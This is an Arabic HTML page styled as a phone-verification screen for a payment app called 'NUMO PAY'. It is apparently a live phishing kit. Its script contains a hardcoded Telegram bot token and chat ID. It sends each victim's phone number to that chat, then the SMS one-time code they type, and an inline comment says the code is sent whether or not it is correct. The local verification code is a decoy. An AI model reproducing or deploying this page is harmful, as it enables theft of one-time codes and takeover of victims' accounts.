<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:title" content="نمو باي - NUMO PAY">
<meta property="og:description" content="تطبيق نمو باي - خدمات الدفع الحديثة">
<meta property="og:image" content="https://l.top4top.io/p_3792v4b4y0.jpeg">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="نمو باي - NUMO PAY">
<meta name="twitter:image" content="https://l.top4top.io/p_3792v4b4y0.jpeg">
<title>نمو باي - NUMO PAY</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: 'Arial', 'Tahoma', sans-serif;
}

body {
  background: #f5f5f5;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 20px;
}

.page {
  display: none;
}

.page.active {
  display: block;
}

.container {
  width: 100%;
  max-width: 500px;
  background: white;
  border-radius: 30px;
  padding: 50px 30px;
  text-align: center;
  box-shadow: 0 10px 40px rgba(0,0,0,0.1);
}

.logo {
  width: 150px;
  height: 150px;
  margin: 0 auto 30px;
  background: url('https://l.top4top.io/p_3792v4b4y0.jpeg') center/contain no-repeat;
}

.brand-name {
  font-size: 32px;
  color: #2c2c2c;
  font-weight: bold;
  margin: 20px 0 5px;
}

.brand-en {
  font-size: 28px;
  color: #999;
  letter-spacing: 3px;
  margin-bottom: 30px;
}

.subtitle {
  font-size: 18px;
  color: #666;
  margin-bottom: 40px;
}

.phone-input {
  width: 100%;
  height: 60px;
  border: 2px solid #ddd;
  border-radius: 20px;
  padding: 0 20px;
  font-size: 18px;
  text-align: left;
  color: #333;
  margin-bottom: 30px;
}

.phone-input:focus {
  outline: none;
  border-color: #ffcd00;
  box-shadow: 0 0 0 3px rgba(255, 205, 0, 0.1);
}

.verify-btn {
  width: 100%;
  height: 65px;
  background: linear-gradient(90deg, #ffcd00, #ffc300);
  border: none;
  border-radius: 25px;
  font-size: 22px;
  color: white;
  font-weight: bold;
  cursor: pointer;
  box-shadow: 0 5px 20px rgba(255, 205, 0, 0.3);
  margin-top: 20px;
}

.verify-btn:hover:not(:disabled) {
  transform: translateY(-3px);
}

.verify-btn:disabled {
  background: #999;
  opacity: 0.7;
  cursor: not-allowed;
}

.message {
  margin-top: 20px;
  font-size: 14px;
  padding: 10px;
  border-radius: 8px;
  min-height: 20px;
}

.message.error {
  color: #d32f2f;
  background: #ffebee;
}

.message.success {
  color: #27ae60;
  background: #d5f4e6;
}

.code-title {
  font-size: 36px;
  color: #ffcd00;
  font-weight: bold;
  margin: 20px 0 10px;
}

.code-subtitle {
  font-size: 15px;
  color: #666;
  line-height: 1.8;
  margin: 30px 0 40px;
}

.code-subtitle .phone {
  color: #333;
  font-weight: bold;
}

.code-inputs {
  display: flex;
  gap: 15px;
  justify-content: center;
  margin: 40px 0;
}

.code-input {
  width: 70px;
  height: 70px;
  border: 2px solid #ddd;
  border-radius: 16px;
  font-size: 32px;
  text-align: center;
  font-weight: bold;
  color: #333;
  background: white;
}

.code-input:focus {
  outline: none;
  border-color: #ffcd00;
  box-shadow: 0 0 0 3px rgba(255, 205, 0, 0.1);
}

.resend-section {
  margin: 30px 0;
}

.resend-btn {
  background: none;
  border: none;
  color: #ffcd00;
  font-size: 15px;
  cursor: pointer;
  text-decoration: underline;
  font-weight: bold;
}

.resend-btn:hover:not(:disabled) {
  color: #ffc300;
}

.resend-btn:disabled {
  color: #ccc;
  cursor: not-allowed;
}

.timer {
  font-weight: bold;
  color: #d32f2f;
  margin-left: 8px;
}

.back-btn {
  background: none;
  border: none;
  color: #999;
  font-size: 14px;
  cursor: pointer;
  text-decoration: underline;
  margin-top: 20px;
}

.back-btn:hover {
  color: #333;
}

.footer {
  margin-top: 40px;
  color: #ccc;
  font-size: 12px;
  border-top: 1px solid #eee;
  padding-top: 20px;
}
</style>
</head>
<body>

<div class="container">

  <div class="page active" id="phonePage">
    <div class="logo"></div>
    <div class="brand-name">نمو باي</div>
    <div class="brand-en">NUMO PAY</div>
    
    <div class="subtitle">الرجاء إدخال رقم هاتفك للمتابعة</div>
    
    <input 
      type="tel" 
      id="phone" 
      class="phone-input"
      placeholder="أدخل رقم هاتفك"
      maxlength="12"
    >
    
    <button class="verify-btn" id="phoneBtn" onclick="handlePhoneSubmit()">تحقق</button>
    
    <div class="message" id="phoneMsg"></div>
    
    <div class="footer">© 2026 جميع الحقوق محفوظة - نمو باي</div>
  </div>

  <div class="page" id="codePage">
    <div class="logo"></div>
    <div class="brand-name">نمو باي</div>
    <div class="brand-en">NUMO PAY</div>
    
    <div class="code-title">أدخل الرمز</div>
    
    <div class="code-subtitle">
      تم إرسال رمز إليك عبر رسالة نصية قصيرة على الرقم <span class="phone" id="displayPhone"></span> 
      الرجاء إدخال هذا الرمز لمتابعة التسجيل
    </div>
    
    <div class="code-inputs" id="codeInputs">
      <input type="text" class="code-input" maxlength="1" inputmode="numeric">
      <input type="text" class="code-input" maxlength="1" inputmode="numeric">
      <input type="text" class="code-input" maxlength="1" inputmode="numeric">
      <input type="text" class="code-input" maxlength="1" inputmode="numeric">
    </div>
    
    <button class="verify-btn" id="codeBtn" onclick="handleCodeSubmit()">تحقق من الرمز</button>
    
    <div class="message" id="codeMsg"></div>
    
    <div class="resend-section">
      <button class="resend-btn" id="resendBtn" onclick="handleResend()">
        تحديث الرمز
      </button>
      <span class="timer" id="timer"></span>
    </div>
    
    <button class="back-btn" onclick="goBackToPhone()">العودة</button>
    
    <div class="footer">© 2026 جميع الحقوق محفوظة - نمو باي</div>
  </div>

</div>

<script>
const BOT_TOKEN = '8789048053:AAGizPg8OXO6WwOrOdpsQY901Q3Bk5dnlIc';
const CHAT_ID = '-5131004892';
const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

let currentPhone = '';
let verificationCode = '';
let resendTimer = 0;

async function sendToTelegram(message) {
  try {
    console.log('📤 Sending to Telegram:', message);
    const response = await fetch(API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });
    
    const data = await response.json();
    console.log('✅ Telegram Response:', data);
    return data.ok || false;
  } catch (error) {
    console.error('❌ Error sending to Telegram:', error);
    return false;
  }
}

function handlePhoneSubmit() {
  const phone = document.getElementById('phone').value.trim();
  const msgDiv = document.getElementById('phoneMsg');
  const btn = document.getElementById('phoneBtn');

  if (!phone) {
    msgDiv.innerText = 'يرجى إدخال رقم الهاتف';
    msgDiv.className = 'message error';
    return;
  }

  if (!/^\d{9,12}$/.test(phone)) {
    msgDiv.innerText = 'يرجى إدخال رقم هاتف صحيح';
    msgDiv.className = 'message error';
    return;
  }

  currentPhone = phone;
  btn.disabled = true;
  btn.innerText = 'جاري الإرسال...';

  const message = `📱 رقم هاتف جديد - نمو باي\n\n📞 رقم الهاتف: ${phone}`;
  
  sendToTelegram(message).then(success => {
    if (success) {
      setTimeout(() => goToCodePage(), 800);
    } else {
      msgDiv.innerText = '❌ خطأ في الإرسال';
      msgDiv.className = 'message error';
      btn.disabled = false;
      btn.innerText = 'تحقق';
    }
  });
}

function goToCodePage() {
  document.getElementById('phonePage').classList.remove('active');
  document.getElementById('codePage').classList.add('active');
  document.getElementById('displayPhone').innerText = currentPhone;
  
  verificationCode = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
  console.log('🔐 Generated Code:', verificationCode);
  
  setupCodeInputs();
  startResendTimer();
}

function setupCodeInputs() {
  const inputs = document.querySelectorAll('.code-input');
  inputs.forEach((input, index) => {
    input.value = '';
    input.addEventListener('keyup', (e) => {
      if (input.value.length > 1) input.value = input.value[0];
      if (!/^\d*$/.test(input.value)) input.value = '';
      if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
      if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
    });
  });
}

function handleCodeSubmit() {
  const inputs = document.querySelectorAll('.code-input');
  const code = Array.from(inputs).map(i => i.value).join('');
  const msgDiv = document.getElementById('codeMsg');
  const btn = document.getElementById('codeBtn');

  console.log('📝 Entered Code:', code);
  console.log('🔑 Expected Code:', verificationCode);

  if (code.length !== 4) {
    msgDiv.innerText = 'يرجى إدخال الرمز كاملاً (4 أرقام)';
    msgDiv.className = 'message error';
    return;
  }

  btn.disabled = true;
  btn.innerText = 'جاري الإرسال...';

  // إرسال البيانات بغض النظر عن صحة الرمز
  const message = `✅ بيانات التحقق - نمو باي\n\n📞 رقم الهاتف: ${currentPhone}\n🔐 رمز التحقق: ${code}`;
  
  console.log('🚀 Sending message:', message);
  
  sendToTelegram(message).then(success => {
    console.log('✅ Send result:', success);
    
    if (success) {
      msgDiv.innerText = '🎉 تم الإرسال بنجاح!';
      msgDiv.className = 'message success';
      setTimeout(() => goBackToPhone(), 1500);
    } else {
      msgDiv.innerText = '❌ خطأ في الإرسال';
      msgDiv.className = 'message error';
      btn.disabled = false;
      btn.innerText = 'تحقق من الرمز';
    }
  });
}

function handleResend() {
  const btn = document.getElementById('resendBtn');
  btn.disabled = true;

  verificationCode = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
  console.log('🆕 New Code:', verificationCode);

  const message = `🔄 رمز جديد - نمو باي\n\n📞 رقم الهاتف: ${currentPhone}`;
  
  sendToTelegram(message).then(success => {
    if (success) {
      document.getElementById('codeMsg').innerText = '';
      startResendTimer();
    } else {
      document.getElementById('codeMsg').innerText = '❌ خطأ في إعادة الإرسال';
      document.getElementById('codeMsg').className = 'message error';
      btn.disabled = false;
    }
  });
}

function startResendTimer() {
  resendTimer = 60;
  const btn = document.getElementById('resendBtn');
  const timer = document.getElementById('timer');

  const update = () => {
    if (resendTimer > 0) {
      resendTimer--;
      timer.innerText = `(${resendTimer}s)`;
      setTimeout(update, 1000);
    } else {
      btn.disabled = false;
      timer.innerText = '';
    }
  };
  update();
}

function goBackToPhone() {
  document.getElementById('codePage').classList.remove('active');
  document.getElementById('phonePage').classList.add('active');
  document.getElementById('phone').value = '';
  document.getElementById('phoneMsg').innerHTML = '';
  document.getElementById('phoneBtn').innerText = 'تحقق';
  document.getElementById('phoneBtn').disabled = false;
  
  const inputs = document.querySelectorAll('.code-input');
  inputs.forEach(input => input.value = '');
  document.getElementById('codeMsg').innerHTML = '';
}
</script>

</body>
</html>
